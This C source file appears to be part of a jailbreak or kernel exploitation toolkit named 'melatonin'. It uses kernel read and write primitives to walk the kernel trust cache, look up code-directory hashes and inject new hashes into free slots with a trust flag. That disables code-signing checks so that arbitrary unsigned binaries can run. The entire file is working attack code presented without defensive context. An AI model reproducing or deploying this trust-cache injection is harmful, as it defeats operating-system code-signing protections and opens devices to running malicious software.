#include <string.h>
#include <stdint.h>
#include "melatonin.h"
#include "offsets.h"

/* trust cache read/inject over an existing entry table */

static kva_t tc_head(void)     { return kread64(kaddr(g_off.trust_head)); }
static uint64_t tc_count(void) { return kread64(tc_head() + g_off.tc_count); }
static kva_t tc_entries(void)  { return kread64(tc_head() + g_off.tc_entries); }

int mela_trust_prepare(void) {
    kva_t h = tc_head();
    if (!mela_is_kptr(h)) return -1;

    uint64_t n = kread64(h + g_off.tc_count);
    kva_t e = kread64(h + g_off.tc_entries);
    if (n == 0 || n > 0x100000) return -1;
    if (!mela_is_kptr(e)) return -1;
    return 0;
}

uint64_t mela_trust_count(void) {
    if (mela_trust_prepare() != 0) return 0;
    return tc_count();
}

static kva_t entry_at(uint64_t i) {
    return mela_canon(tc_entries()) + i * g_off.tc_entry_size;
}

int mela_trust_lookup(const uint8_t cdhash[20]) {
    if (mela_trust_prepare() != 0) return -1;

    uint64_t n = tc_count();
    uint8_t got[20];

    for (uint64_t i = 0; i < n; i++) {
        if (kread(entry_at(i) + g_off.tc_hash, got, sizeof got) != 0) return -1;
        if (!memcmp(got, cdhash, sizeof got)) return 1;
    }
    return 0;
}

int mela_trust_free_slot(void) {
    if (mela_trust_prepare() != 0) return -1;

    uint64_t n = tc_count();
    uint8_t zero[20] = {0}, got[20];

    for (uint64_t i = 0; i < n; i++) {
        if (kread(entry_at(i) + g_off.tc_hash, got, sizeof got) != 0) return -1;
        if (!memcmp(got, zero, sizeof got)) return (int)i;
    }
    return -1;
}

int mela_trust_add(const uint8_t cdhash[20]) {
    if (mela_trust_lookup(cdhash) == 1) return 0;

    int slot = mela_trust_free_slot();
    if (slot < 0) return -1;

    kva_t e = entry_at((uint64_t)slot);
    if (kwrite(e + g_off.tc_hash, cdhash, 20) != 0) return -1;
    uint64_t flags = 1;
    if (kwrite64(e + g_off.tc_flags, flags) != 0) return -1;
    return 0;
}
